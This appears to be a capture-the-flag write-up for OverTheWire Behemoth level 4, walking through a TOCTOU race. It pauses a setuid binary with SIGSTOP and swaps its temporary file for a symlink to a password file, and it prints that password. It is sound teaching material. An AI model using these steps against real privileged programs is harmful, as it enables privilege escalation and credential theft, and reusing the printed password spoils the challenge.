# Behemoth Level 4 → 5

## Goal

`behemoth4` creates a file named `/tmp/<pid>`, writes to it, then reads it back — but the **window between create and read** is long enough that you can swap the file for a symlink pointing at `behemoth5`'s password. The program then obligingly reads (and prints) the contents of the password file.

This is a classic **TOCTOU** (Time-Of-Check, Time-Of-Use) race. You don't even have to win it by timing — you can *pause* the process mid-flight with a signal.

## Concepts you'll learn

- TOCTOU races — a file is checked/created at time T1 and used at time T2, and an attacker modifies it in between
- Process control signals: `SIGSTOP` (pause a process) and `SIGCONT` (resume it)
- Symbolic links as a "redirect this path" primitive: `ln -s /secret /tmp/mine` makes `/tmp/mine` read `/secret`
- Running a target in the background (`&`) and getting its PID (`$!`)

## Walkthrough

### 1. Understand the binary's behaviour

```bash
$ cd /behemoth
$ strace ./behemoth4 2>&1 | head -40
```

You'll see something like:

```
open("/tmp/12345", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 3
write(3, "...", ...)
close(3)
...
open("/tmp/12345", O_RDONLY)         = 3
read(3, ..., ...)
write(1, "...", ...)        # prints contents back
```

Two key observations:

- The file is named after `getpid()` — predictable.
- There's a gap (in wall-clock time) between the first `close` and the second `open`.

If we can make the second `open` resolve to a different file than the first, the program will read — and print — whatever file we want.

### 2. Check what behemoth5 reads during that gap

`behemoth4` is setuid `behemoth5`, so whoever wrote this binary probably intended it to read **from the file it just created**. We want it to read from `/etc/behemoth_pass/behemoth5` instead. A symlink does the trick.

### 3. Run the binary paused

```bash
$ /behemoth/behemoth4 &
$ BPID=$!
$ kill -STOP $BPID
```

Breakdown:

- `/behemoth/behemoth4 &` — start it in the background
- `$!` — shell variable holding the PID of the last backgrounded job; capture it into `BPID`
- `kill -STOP $BPID` — send SIGSTOP, which pauses the process indefinitely

If you were very fast and lucky, the process is now paused **after** creating `/tmp/$BPID` and **before** re-opening it. In practice, most of `behemoth4`'s run is spent inside that re-open or read — so the pause lands in a useful place a large fraction of the time.

### 4. Replace the file with a symlink to the password

```bash
$ rm -f /tmp/$BPID
$ ln -s /etc/behemoth_pass/behemoth5 /tmp/$BPID
$ ls -l /tmp/$BPID
lrwxrwxrwx 1 behemoth4 behemoth4 ... /tmp/12345 -> /etc/behemoth_pass/behemoth5
```

`/tmp/$BPID` is now a redirect to the password file. When `behemoth4` (running as effective UID `behemoth5`) opens it, the kernel follows the symlink and reads `/etc/behemoth_pass/behemoth5` — which `behemoth5` is allowed to read.

### 5. Let it continue

```bash
$ kill -CONT $BPID
```

SIGCONT resumes the paused process. It finishes its second `open`/`read`/`write(1, ...)` and prints:

```
aizeeshing
```

That's the contents of `/etc/behemoth_pass/behemoth5`.

### 6. If you didn't pause in time

If `strace` showed the re-open happening almost instantly, you may need a different approach — usually a tight shell loop that races the binary:

```bash
$ while true; do
    rm -f /tmp/$$
    ln -sf /etc/behemoth_pass/behemoth5 /tmp/$$
  done &
$ /behemoth/behemoth4
```

(Replace `$$` with the PID the target will use — often not your shell's PID, so scripting this is fiddly. The SIGSTOP approach is cleaner.)

## The answer

The password for `behemoth5` is:

**`aizeeshing`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth4.html>
